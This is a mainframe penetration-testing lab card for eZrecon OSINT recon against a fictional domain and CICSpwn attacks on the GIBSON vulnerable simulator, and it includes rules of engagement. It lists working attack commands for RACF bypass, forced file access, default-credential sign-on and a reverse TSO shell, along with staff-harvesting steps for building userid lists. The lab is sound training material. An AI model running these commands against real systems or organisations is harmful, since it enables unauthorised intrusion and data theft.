Mainframe Recon Lab Card

Everything to run the EZrecon-2 labs from the keyboard. Set up and smoke-tested on this MacBook Pro: Apple Silicon, macOS 26, Homebrew Python 3.14, ezrecon 2.23.4 via pipx. eZrecon is by Kev Milne and Phil Young; CICSpwn by Ayoub Elaassal. See Credits at the foot.

eZrecon target sighberbank.com CICSpwn target GIBSON · 127.0.0.1:23 · CICS legend passive / active = needs authorisation
Rules of engagement

Active checks change state or touch the target. Run them only against systems you own or are explicitly authorised to test. GIBSON is a deliberately vulnerable simulator that exists so you can practise the CICS techniques safely; it is not permission to test anything else.

01

Start of day — pre-flight

run before the room fills

Fast path: ./setup.sh once per machine, then ./start.sh --gibson each day, then ./status.sh for the all-green check. The block below is what those scripts automate.

# 1 · eZrecon is alive
ezrecon --version                     # → EZRecon 2.23.4

# 2 · nmap + the mainframe scripts are visible to eZrecon
ezrecon nse list | grep -E 'cics|tso|drda|tn3270|vtam'

# 3 · SearXNG is up  (start Docker Desktop first if needed)
ezrecon searx status                  # Container running: True / JSON API: True
#   if not:  ezrecon searx setup --yes --port 10080

# 4 · keys — only for the keyed labs, skip otherwise
ezrecon config set shodan_api_key  <key>
ezrecon config set google_api_key  <key>
ezrecon config set google_cse_id   <id>
ezrecon config set hibp_api_key    <key>
ezrecon config show

# 5 · CICSpwn labs — start GIBSON, then confirm port 23 answers
cd ~/git/GIBSON/gibson-mainframe && ./run_gibson.sh   # separate terminal
nc -z 127.0.0.1 23 && echo "GIBSON 3270 is listening"
02

eZrecon labs

target · sighberbank.com

All passive and keyless unless tagged. Append --report ./out to any command to also write md + html + json + queries.txt + a graph.

Lab 0 — first sweepThe whole passive chain in one run.
passive 
ezrecon auto sighberbank.com --report ./out
ezrecon graph ./out/ezrecon_sighberbank_com.json --out ./out/g.html

Read the reds in the table first — those are the leads. Then open the graph and pivot from a high-value node.

DNSRecords, SPF/DMARC, zone transfer.
passive 
ezrecon dns sighberbank.com

MX = mail provider. TXT entries naming middleware or gateways in front of z/OS. Any AXFR that succeeds hands you the whole map.

WHOISRegistration record.
passive 
ezrecon whois sighberbank.com

Registrar, creation date, name servers. A redacted registrant is normal. Thin behind a firewall that blocks port 43.

SubdomainsBrute + keyless passive sources.
passive 
ezrecon subdomains sighberbank.com
# --no-brute for passive only · --wordlist <file> for depth

Gateway- and mainframe-looking hostnames. Feed a promising one into MyMap once you have authorisation.

crt.shCertificate transparency logs.
passive 
ezrecon crtsh sighberbank.com

Internal-looking names a wordlist would never guess. Compare against the brute list. crt.sh rate-limits — retry if empty.

WaybackArchived URLs from the Internet Archive.
passive 
ezrecon wayback sighberbank.com

Archived JCL / COBOL / config / backup files, and pages deleted from the live site but still captured.

Document metadataAuthors and software from public docs.
passive 
ezrecon docmeta sighberbank.com

Author / last-modified-by usernames are candidate TSO or RACF userids. Note software versions too.

People harvestEmails, names, inferred naming pattern.
passive 
ezrecon harvest sighberbank.com --deep

A handful of confirmed addresses plus a few names gives you a userid list via the inferred pattern.

TakeoverDangling DNS / subdomain takeover.
passive 
ezrecon takeover sighberbank.com
# DNS-only. --http to confirm is active and gated.

A HIGH result is a hostname an attacker could serve content from as the organisation.

Google dorksMainframe dork catalogue.
passive 
ezrecon dork sighberbank.com --all --links
# add --fetch for real results via SearXNG

--links always works. Fresh SearXNG gets throttled by upstreams; a Google CSE key makes --fetch reliable.

GitHub dorksCode-search scoped to the org.
passive 
ezrecon github sighberbank.com --org <org>
# --fetch needs a GitHub token

Query links for leaked copybooks and connection strings.

AI OSINT promptStructured prompt from the session.
passive 
ezrecon prompt sighberbank.com

Paste into an assistant for a fast second read on what matters after a busy run.

Shodan sweepMainframe fingerprints Shodan already holds.
passive needs key 
ezrecon shodan --mainframe sighberbank.com

No packet sent by you — this reads Shodan's existing scans.

CTI newsMainframe security feeds.
passive 
ezrecon rss

Anything tied to the target in the week's mainframe security news.

The TUI MyMap screen (n) is where you actually run NSE scans — it has a Run button with a confirm. Lab: n → MAINFRAME → tso-enum → read its args → set target and -p 23 on the $ nmap line → Run → Report.

CICSpwn labs

GIBSON · 127.0.0.1 23 · APPLID CICS

Run from ~/git/Ezrecon/cicspwn/. The lab guide writes ./cicspwn.py; on this Mac use ./cicspwn — a wrapper that picks the venv Python that has py3270. Everything after that matches the guide.

cd ~/git/Ezrecon/cicspwn
Lab 0 — first contactConfirm you can reach the CICS terminal.
active 
./cicspwn -a CICS 127.0.0.1 23 -i

Expect [+] Connecting to target 127.0.0.1:23 then [*] Access to CICS Terminal is possible with APPID CICS.

Lab 1 — recon (-i)Fingerprint the region.
active 
./cicspwn -a CICS 127.0.0.1 23 -i

Reachable txns (CEMT / CEDA / CECI…), z/OS 2.05 / CICS TS 73, Sysid GIB1, HLQ GIBSON.BANK.**, active users, spool, ESM present.

Lab 2 — TS queue enum (-e)List temporary-storage queues and depth.
active 
./cicspwn -a CICS 127.0.0.1 23 -e

A Tsqueue Items Length Transaction table (GIBSON, BANKAUD, PWNLOG). If blocked, retry with --bypass.

Lab 3 — read a VSAM fileTurn a file readable and read it.
active 
./cicspwn -a CICS 127.0.0.1 23 --get-file FILEA
./cicspwn -a CICS 127.0.0.1 23 --get-file FILEB

FILEA reads straight away. FILEB starts closed — CICSpwn flips it OPEN ENA READ via CEMT, then reads it.

Lab 4 — RACF bypassCopy protected txns to unprotected names.
active 
./cicspwn -a CICS 127.0.0.1 23 -e --bypass

CEMT → CSPS and CECI → CSPK copied and installed via CEDA. Lab 2 then works even where it was blocked.

Lab 5 — enable transactionsRe-enable disabled transactions.
active 
./cicspwn -a CICS 127.0.0.1 23 --enable-tran ALL

Expect [+] Activating ALL transactions. Swap ALL for a single txn id to enable just one.

Lab 6 — authenticated opsSign on before acting.
active 
./cicspwn -a CICS 127.0.0.1 23 -U IBMUSER -P SYS1 --enable-tran ALL

Needs GIBSON in realistic-auth mode so it presents CESN on connect. Otherwise: "could not find a password field", continues unauthenticated.

Lab 7 — TSO shell via spoolCommand channel through the internal reader. Advanced.
active 
./cicspwn -a CICS 127.0.0.1 23 -s reverse_tso -l <your-ip>:4445
./cicspwn -a CICS 127.0.0.1 23 -s direct_tso

Needs a working IRDR TD queue and a live JES spool token. Treat as the objective for a full target, not a guaranteed result on base GIBSON.

Troubleshooting

SymptomMeaning / fix
ImportError: x3270App / "bytes found"Ran the unpatched tool with system Python. Use ./cicspwn or .venv/bin/python cicspwn.py.
"Could not find a password field"GIBSON didn't present a sign-on screen. Run without -U/-P, or start GIBSON in realistic-auth mode.
"Keyboard locked / Operator error"Panel not accepting input where expected. Confirm the target is the reworked GIBSON build.
"Could not list tsqueues through Inquire"Retry the command with --bypass (Lab 4).
ezrecon hangs on a bare runThe TUI needs a real terminal. Use Terminal.app / iTerm, not a pipe or non-interactive shell.
ezrecon whois → only the IANA stubOutbound port 43 blocked on this network. WHOIS is richer on an unfiltered link; DNS and crt.sh still work.
crtsh / wayback return nothingThose services were flaky during setup. Retry — they rate-limit. Not an install problem.
dork --fetch → "engines rate-limited"A fresh SearXNG gets throttled by upstreams. --links always works; a Google CSE key makes --fetch reliable.
nse / MyMap → "nmap not found"Shouldn't happen now. The hint text says apt even on macOS — ignore it.
MyMap "Refresh script.db" failsNeeds sudo nmap --script-updatedb in your own terminal. Not required — brew shipped a built db.
Reports say "EZRecon 2.0 / passive only"Known stale strings in this build. Cosmetic — the tool is 2.23.4 and has the nmap runner.
